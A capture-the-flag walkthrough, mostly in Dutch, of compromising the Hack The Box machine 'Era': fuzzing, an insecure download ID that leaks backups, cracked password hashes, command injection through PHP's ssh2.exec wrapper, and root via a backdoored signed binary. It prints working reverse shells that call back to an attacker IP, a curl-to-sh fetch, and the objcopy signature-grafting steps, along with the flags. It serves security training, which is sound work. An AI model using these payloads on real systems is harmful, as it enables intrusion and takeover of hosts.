# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Era]
└─$ nmap -p- 10.129.147.2 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 17:24 CEST
Nmap scan report for 10.129.147.2
Host is up (0.023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```
### Detailed port scan

At the detailed port scan go to get more information from the services which are open on the ip address.

```
┌──(kali㉿kali)-[~/HTB/Era]
└─$ nmap -p21,80 -sCV 10.129.147.2   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 17:24 CEST
Nmap scan report for 10.129.147.2
Host is up (0.027s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We komen op de volgende website als je naar de url surft.

![[Pasted image 20250728104906.png]]

Als je gaat rond kijken op de website kan je niet direct iets vinden waarmee je verder kan. Ik ben dus gaan zoeken met het ffuf commando als er geen subndomain is. Zoals je hieronder zult kunnen zien hebben we het subdomain file gevonden.

```
┌──(kali㉿kali)-[~/HTB/Era]
└─$ ffuf -u http://era.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host:FUZZ.era.htb" -ac

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 27ms]
File                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 17ms]
:: Progress: [220560/220560] :: Job [1/1] :: 2000 req/sec :: Duration: [0:01:39] :: Errors: 0 ::
```

Als we deze zullen gaan toevoegen dan kan je de volgende pagina zien. Op de pagina zelf kan je helemaal niks doen. Ik ben dus nu gaan kijken of dat er geen files zijn die we kunnen fuzze.

![[Pasted image 20250728110642.png]]

```
┌──(kali㉿kali)-[~/HTB/Era]
└─$ ffuf -u http://file.era.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -ac

register.php            [Status: 200, Size: 3205, Words: 1094, Lines: 106, Duration: 17ms]
login.php               [Status: 200, Size: 9214, Words: 3701, Lines: 327, Duration: 27ms]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
logout.php              [Status: 200, Size: 70, Words: 6, Lines: 1, Duration: 16ms]
upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
manage.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
layout.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
reset.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
:: Progress: [17129/17129] :: Job [1/1] :: 1923 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

Dus aangezien dat we geen user hebben voor inteloggen, kunnen we de register.php file gaan gebruiken voor een user aan te maken.

![[Pasted image 20250728111000.png]]
1x ingeloged kan je zien dat je files kunt gaan manage, uploaden, Update van de security questions, ... Ik zal een file gaan aanmaken en deze gaan uploaden op de pagina. Nu dat we de file zijn gaan uploaden kan je het pad naar de download folder zien.

![[Pasted image 20250728113649.png]]

wat als we nu gaan fuzzen op andere ID's zodat we andere files kunnen gaan bekijken. Zoals je het commando van hieronder zult gaan bekijken zal je zien dat er 3 id's gevonden zijn.

```
ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -H "Cookie: PHPSESSID=ov6i2nv8l0k5f0dnofkn1akstm" -fc 403 -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /home/kali/HTB/Era/nummers
 :: Header           : Cookie: PHPSESSID=ov6i2nv8l0k5f0dnofkn1akstm
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

WuVfctPX                [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 30ms]
054                     [Status: 200, Size: 6379, Words: 2552, Lines: 222, Duration: 35ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 43ms]
```

Als ik de line id's zal gaan opzoeken dan kan je zien dat je 2 zip bestanden kunt downloaden.
Unzip de files op de files met sqlite en daar kan je de hashes vinden.

```
┌──(kali㉿kali)-[~/HTB/Era]
└─$ sqlite3 filedb.sqlite
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> SELECT * FROM files;
54|files/site-backup-30-08-24.zip|1|1725044282
sqlite> SELECT * FROM users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
sqlite> 
```

```
┌──(kali㉿kali)-[~/HTB/Era]
└─$ cat ~/.john/john.pot    
$2a$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:america
$2a$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:mustang

```

je kan ook zien dat we de username `admin_ef01cab31aa` hebben. Ik zal de security questions gaan aanpassen voor deze users. eens dat je zal gaan inloggen met de user waarvan je zonet de security questions hebt upgedate zal je kunnen inloggen door dezelfde gegevens intevullen.

![[Pasted image 20250728135707.png]]

Nu dat we ingelogged zijn als de admin user dan kunnen we verder gaan kijken of dat we niets kunnen doen met deze user. Als je gaat kijken in de ftp server met de user yuri en zijn password mustang, dan kan je binnen de php8.1_conf folder gaan kijken dat er een ssh2.so file is. Als we op het internet ssh2.so file zult gaan zoeken kom je op de volgende url terecht https://www.php.net/manual/en/book.ssh2.php. Deze zal je gaan helpen met het maken van een ssh connectie met de server door dat de ssh poort niet openstaat. Je zal een shell.sh file moeten aanmaken waarin je het commando voor de connectie met server zult moeten inzetten. mkfifo is een fifo bestand (first in first out) waarmee je de connectie zult kunnen opzetten.

```
┌──(kali㉿kali)-[~/HTB/Era]
└─$ cat shell.sh
mkfifo /tmp/s; /bin/sh </tmp/s | nc 10.10.16.10 4444 >/tmp/s; rm /tmp/s
```

Doordat we een shell.sh file hebben aangemaakt, zal je alleen een python server moeten opzetten op poort 80 zodat de connectie wordt opgevangen.

```
┌──(kali㉿kali)-[~/HTB/Era]
└─$ curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: file.era.htb' \
    -b $'PHPSESSID=9pn3236e2gjoou7ltp9aq980g5' \
    $'http://file.era.htb/download.php?id=3406&&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/curl+-s+http://10.10.16.10/shell.sh|sh;'
HTTP/1.1 504 Gateway Time-out
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Jul 2025 17:35:21 GMT
Content-Type: text/html
Content-Length: 176
Connection: keep-alive
```

```
┌──(kali㉿kali)-[~/HTB/Era/penelope]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.119.230 - - [29/Jul/2025 01:20:41] "GET /shell.sh HTTP/1.1" 200 -
10.129.119.230 - - [29/Jul/2025 01:21:01] "GET /shell.sh HTTP/1.1" 200 -
```

Je zal ook een listener moeten opzetten op poort 4444 --> (own chosen port) je moet dezelfde poort gebruiken die dat je hebt gebruikt in je shell.sh file. als je dan gaat kijken naar de listener dan kan je zien dat je een connectie met de ssh server hebt gemaakt met de user yuri. Ik ben het python3 -c 'import pty; pty.spawn("/bin/bash")' commando gaan gebruiken voor een stabiele connectie tot stand te brengen.

```
┌──(kali㉿kali)-[~/HTB/Era]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.119.230] 34130
python3 -c 'import pty; pty.spawn("/bin/bash")'
yuri@era:~$ 

```

Zoals je kunt zien zijn we ingeloged als user yuri. maar zoals je hieronder zult kunnen zien is er niets te zien binnen deze user. 

```
yuri@era:~$ ls
ls
```

Ik zal dus de andere username en password moeten gebruiken voor in te loggen op de ssh server. Dit kan je gewoon doen door het su commando te gebruiken. 

```
yuri@era:~$ su eric
su eric
Password: america                                                                                             
eric@era:/home/yuri$
```

Als we nu naar de home folder van de user eric gaan dan zal je kunnen zien dat daar de user flag staat.

User flag: 6b456524ee148e55a924afa594f252c3

```
eric@era:~$ cat user.txt
cat user.txt
6b456524ee148e55a924afa594f252c3
```

Ik ben dus nu linpeas gaan runnen voor het zien of er niet iets interessant te zien is. Hierbij kan je zien dat er door de root user een script gerunned wordt die dat gaat nakijken voor de signature in de /opt folder. 

```
eric@era:~$ ./linpeas_linux_amd64

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root eric 33 Jul 28 11:54 /home/eric/user.txt                                                          
-rwxrw---- 1 root devs 16544 Jul 28 19:16 /opt/AV/periodic-checks/monitor
-rw-rw---- 1 root devs 205 Jul 28 19:16 /opt/AV/periodic-checks/status.log

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                    
  Group devs:                                                                                                       
/opt/AV                                                                                                             
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

There is nothing telling you that the binary itself is being executed. Ik ben dus gaan zoeken op het internet naar"linux sign binary github", there you should be able to find the following URL https://github.com/NUAA-WatchDog/linux-elf-binary-signer.  

Aanmaken van een c# file. Deze zullen we ook gaan uploaden naar de ssh server.

```
Op de kali machine
┌──(kali㉿kali)-[~/HTB/Era]
└─$ cat test_shell.c                      
#include <stdlib.h>

int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.10/8596 0>&1'");
    return 0;
}

Op de ssh connectie
eric@era:/tmp$ wget http://10.10.16.10:8000/test_shell.c
```

Tijdens mijn onderzoek op de Era-machine ontdekte ik dat het bestand `/opt/AV/periodic-checks/monitor` uitvoerbaar was door root, maar beschrijfbaar voor de groep `devs`, waar ik als gebruiker deel van uitmaakte. Dit bood een potentieel pad naar privilege escalation. Ik merkte op dat het bestand een `.text_sig` sectie bevatte, wat wees op een handtekeningmechanisme.

Ik compileerde een statisch gelinkte binary met een reverse shell payload om afhankelijkheden te vermijden. Vervolgens gebruikte ik `objcopy` om de `.text_sig`-sectie uit het originele bestand te halen en injecteerde deze in mijn eigen binary. Hiermee omzeilde ik vermoedelijk de verificatie, die enkel controleerde op de aanwezigheid van de sectie, en niet op de geldigheid ervan.

Tot slot verving ik het originele bestand met mijn aangepaste versie. Hierdoor werd mijn payload met rootrechten uitgevoerd zodra het monitorproces werd getriggerd, wat resulteerde in een succesvolle privilege escalation. https://medium.com/@muchiemma/linux-privilege-escalation-3fb61a09f7ba 
https://manpages.ubuntu.com/manpages/focal/en/man1/objcopy.1.html

```
eric@era:/tmp$ gcc -static -o monitor_backdoor test_shell.c
eric@era:/tmp$ objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
eric@era:/tmp$ objcopy --add-section .text_sig=sig monitor_backdoor
eric@era:/tmp$ cp monitor_backdoor /opt/AV/periodic-checks/monitor
```

Zoals je kan zien hebben we nu de root flag bemachtiged door dat de connectie met de listener is op gezet als de root user.
Root flag: 5f707bad56292bee11c608f4ea95d7ee

```
┌──(kali㉿kali)-[~/HTB/Era]
└─$ nc -lvnp 8596
listening on [any] 8596 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.138.34] 49294
bash: cannot set terminal process group (7316): Inappropriate ioctl for device
bash: no job control in this shell
root@era:~# ls
ls
answers.sh
clean_monitor.sh
initiate_monitoring.sh
monitor
root.txt
text_sig_section.bin
root@era:~# cat root.txt
cat root.txt
5f707bad56292bee11c608f4ea95d7ee
```

![[Pasted image 20250728224322.png]]